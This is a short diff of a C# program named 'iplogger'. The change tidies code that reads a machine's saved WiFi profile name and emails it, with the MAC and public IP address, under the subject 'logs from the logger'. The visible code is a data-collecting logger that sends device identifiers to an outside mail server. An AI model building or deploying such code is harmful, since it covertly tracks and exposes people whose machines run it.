@@ -15,8 +15,6 @@ namespace iplogger
             foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
             {
                 string name = null;
-                string name2 = null;
-                string name3 = null;
                 static string GetStringForSSID(Wlan.Dot11Ssid ssid)
                 {
                     return Encoding.ASCII.GetString(ssid.SSID, 0, (int)ssid.SSIDLength);
@@ -27,8 +25,6 @@ namespace iplogger
                     foreach (Wlan.WlanProfileInfo profileInfo in wlanIface.GetProfiles())
                     {
                         name = profileInfo.profileName; // this is typically the network's SSID
-                        name2 = profileInfo.profileName;
-                        name3 = profileInfo.profileName;
                         break;
                     }
                     Console.WriteLine(name);
@@ -52,7 +48,7 @@ namespace iplogger
                     {
                         Subject = "logs from the logger"
                         ,
-                        Body = $"Mac Address: {mac} Ip Address: {publicip} Random profile wifi ssid: {name} {name2} {name3}"
+                        Body = $"Mac Address: {mac} Ip Address: {publicip} Random profile wifi ssid: {name}"
                     })
                     {
                         smtp.Send(message);
